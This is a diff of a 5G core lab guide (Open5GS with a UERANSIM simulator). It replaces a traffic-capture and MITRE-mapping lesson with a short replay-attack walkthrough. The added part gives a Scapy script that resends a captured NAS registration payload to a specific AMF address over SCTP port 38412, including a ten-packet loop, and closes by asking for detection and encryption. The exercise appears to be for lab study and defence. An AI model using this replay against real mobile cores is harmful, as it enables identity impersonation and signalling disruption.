@@ -12,83 +12,29 @@ A functional UERANSIM (UE + gNB simulator)
 
 Access to tcpdump, Wireshark, and Scapy
 
+STEP 1 - Open the Registration messsage, get the NAS PDU Payload , AMF IP and port details
 
-Step 1: Capture 5G Authentication Flows
-
-Start UERANSIM UE session to initiate registration and PDU session.
-
-./nr-ue -c ../config/open5gs-ue.yaml
-
-Capture packets on the AMF pod:
-
-kubectl exec -it -n open5gs <amf-pod> -- tcpdump -i any -w /tmp/amf-auth.pcap port 38412
-
-Download the PCAP to your local machine:
-
-kubectl cp open5gs/<amf-pod>:/tmp/amf-auth.pcap ./amf-auth.pcap
-
-Open it in Wireshark with filter:
-
-ngap || nas-5gs
-
-🔬 Step 2: Analyze Security Parameters
-
-Message
-
-Focus Parameters
-
-Registration Request/Accept
-
-SUPI/SUCI, GUTI, 5GS Security Context
-
-Authentication Request/Response
-
-RAND, AUTN, RES*, KSEAF
-
-Initial Context Setup Request
-
-UE NGAP ID, NAS Security Parameters, Algorithms
-
-PDU Session Establishment Req/Resp
-
-PDU Session ID, QoS, DNN, S-NSSAI
-
-🔁 Step 3: Replay Attack Simulation
-
-Use Scapy to simulate a replay:
+Step 2: Craft a Scappy message to send towards AMF
 
 from scapy.all import *
+payload = bytes.fromhex("7e00417900350102f8390000010100644f8f74662c09ef0fe3554582f1fe0933704251acd1a7a12b81ef9730474cf3642b765fcafaadb64fac56dc2e04f0f0f0f0")
+pkt = IP(dst="10.246.198.80") / SCTP(dport=38412, sport=3456) / Raw(load=payload)
 
-payload = bytes.fromhex("<PASTE_YOUR_NAS_HEX_PAYLOAD>")
-pkt = IP(dst="<AMF_IP>") / SCTP(dport=38412, sport=3456) / Raw(load=payload)
+Step 3: Execute the scappy messagage 
 send(pkt)
 
-⚠️ Make sure you're using an unencrypted NAS message (e.g., Registration or Auth).
+for 10 packets use below command
 
-🕵️ Step 4: TTP Mapping Table
+for _ in range(10):
+    send(pkt)
 
-Parameter, Risk Example , TTP Mapping, SUPI/SUCI reuse, Replay of UE identity, Credential Access → Identity Impersonation
+Step 4: monitor the trace message
 
-AUTN/RES* mismatch , Faked auth response , Defense Evasion → Protocol Manipulation
+kubectl exec -n open5gs -it open5gs-core-amf-deployment-696c8bbcdf-m8g5b -- \
+  tcpdump -i any port 38412 -nn -vv
 
+Result: You should see messages coming to the AMF POD
 
-🧾 Expected Deliverables
-
-✅ Annotated .pcap file with highlighted parameters
-
-✅ A written report mapping captured data to MITRE FIGHT or ATT&CK TTPs
-
-✅ (Optional) Scapy replay script or detection rule idea
-
-🧰 Tools Used
-
-Wireshark, tcpdump , Scapy, Open5GS, MITRE FIGHT
-
-🚀 Suggested Extensions
-
-Simulate Red vs. Blue: replay attack + detect using Open5GS logs or SIEM
-
-Add alerting logic using Falco, Prometheus, or ELK
-
+Can you set detection rule ? and encrypt the messages so that the attacker cannot do replay attacks ?
 
 
